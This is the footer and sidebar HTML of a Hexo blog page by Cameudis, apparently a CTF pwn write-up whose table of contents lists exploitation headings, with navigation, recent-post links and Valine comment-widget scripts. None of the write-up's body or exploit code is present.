src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/Tech/PoRE/d5088fb7cb3c.html" title="PoRE#0x3 Burp Extension"><img class="cover" src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">PoRE#0x3 Burp Extension</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/ava1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Cameudis</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cameudis"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"><span class="toc-text">泄露libc地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%EF%BC%81"><span class="toc-text">攻击！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC"><span class="toc-text">完整脚本</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/f6c454d44380.html" title="【pwnable.tw】Re-alloc writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【pwnable.tw】Re-alloc writeup"/></a><div class="content"><a class="title" href="/Tech/Pwn/f6c454d44380.html" title="【pwnable.tw】Re-alloc writeup">【pwnable.tw】Re-alloc writeup</a><time datetime="2023-04-13T15:03:41.000Z" title="Created 2023-04-13 23:03:41">2023-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/PoRE/d5088fb7cb3c.html" title="PoRE#0x3 Burp Extension"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PoRE#0x3 Burp Extension"/></a><div class="content"><a class="title" href="/Tech/PoRE/d5088fb7cb3c.html" title="PoRE#0x3 Burp Extension">PoRE#0x3 Burp Extension</a><time datetime="2023-04-11T13:58:41.000Z" title="Created 2023-04-11 21:58:41">2023-04-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Tech/Pwn/141743759f16.html" title="【UTCTF 2023】Bing Chilling"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【UTCTF 2023】Bing Chilling"/></a><div class="content"><a class="title" href="/Tech/Pwn/141743759f16.html" title="【UTCTF 2023】Bing Chilling">【UTCTF 2023】Bing Chilling</a><time datetime="2023-04-04T05:19:34.000Z" title="Created 2023-04-04 13:19:34">2023-04-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://i.imgtg.com/2023/04/11/8zHiD.png')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Cameudis</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Exp10re the W0r1d!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
+      appKey: '6VqGye1352LX381YQDTOaiXs',
+      avatar: 'retro',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, [{"placeholder":"El Psy Congroo"}]))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
